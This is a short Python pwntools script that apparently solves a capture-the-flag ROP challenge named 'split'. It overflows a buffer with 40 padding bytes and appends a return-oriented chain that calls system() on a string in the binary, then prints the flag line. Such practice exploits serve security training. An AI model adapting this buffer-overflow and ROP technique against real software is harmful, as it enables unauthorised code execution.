from pwn import *

context.binary = "./split"
e = ELF("./split")
r = ROP(e)
p = e.process()
r.call("system", [e.symbols["usefulString"]])
p.send(b"A" * 8 * 5 + r.chain())
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
